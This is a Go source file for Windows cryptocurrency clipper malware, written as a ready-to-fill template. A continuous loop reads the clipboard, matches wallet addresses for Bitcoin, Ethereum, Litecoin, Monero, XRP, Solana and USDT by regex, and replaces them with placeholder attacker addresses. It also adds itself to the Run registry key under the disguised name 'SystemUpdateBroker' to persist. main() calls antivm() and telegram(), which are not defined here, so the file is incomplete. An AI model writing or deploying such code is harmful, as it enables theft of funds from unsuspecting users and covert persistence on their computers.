package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"

	"github.com/atotto/clipboard"

	"golang.org/x/sys/windows/registry"
)

// fixed config
const (
	avm      = true
	tg       = true
	chatid   = "chatid"
	bottoken = "bottoken"
	BTC      = "insert btc here"
	ETH      = "insert eth here"
	LTC      = "instert ltc here"
	XMR      = "insert monero here"
	USDT     = "insert usdt"
	SOL      = "insert sol"
	XRP      = "insert xrp"
)

func main() {
	if avm == true {
		antivm()
	}

	if tg == true {
		telegram()
	}
	startup()
	clip()

}

func clip() {
	ltcregexp := regexp.MustCompile(`^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$`)
	ethregexp := regexp.MustCompile(`^0x[a-fA-F0-9]{40}$`)
	btcregexp := regexp.MustCompile(`^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$`)
	btcb32regexp := regexp.MustCompile(`^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$`)
	xmrregexp := regexp.MustCompile(`\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93,105}\b`)
	xrpregexp := regexp.MustCompile(`\br[1-9A-HJ-NP-Za-km-z]{24,34}\b`)
	solregexp := regexp.MustCompile(`\b[1-9A-HJ-NP-Za-km-z]{32,44}\b`)
	usdt := regexp.MustCompile(`\b0x[a-fA-F0-9]{40}\b`)

	for {

		getclipboard, err := clipboard.ReadAll()
		if err != nil {
			fmt.Print("clipboard error")
		}

		if btcb32regexp.MatchString(getclipboard) || btcregexp.MatchString(getclipboard) {
			fmt.Println("BTC DETECTED")
			clipboard.WriteAll(BTC)
		} else if ethregexp.MatchString(getclipboard) {
			fmt.Println("ETH DETECTED")
			clipboard.WriteAll(ETH)
		} else if ltcregexp.MatchString(getclipboard) {
			fmt.Println("LTC DETECTED")
			clipboard.WriteAll(LTC)
		} else if xmrregexp.MatchString(getclipboard) {
			fmt.Println("monero detected")
			clipboard.WriteAll(XMR)
		} else if xrpregexp.MatchString(getclipboard) {
			fmt.Println("xrp detected")
			clipboard.WriteAll(XRP)
		} else if solregexp.MatchString(getclipboard) {
			fmt.Println("solana detected")
			clipboard.WriteAll(SOL)
		} else if usdt.MatchString(getclipboard) {
			fmt.Println("usdt detected")
			clipboard.WriteAll(USDT)
		}

	}
}
func startup() {

	exepath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	err = key.SetStringValue("SystemUpdateBroker", exepath)
	if err != nil {
		panic(err)
	}

}
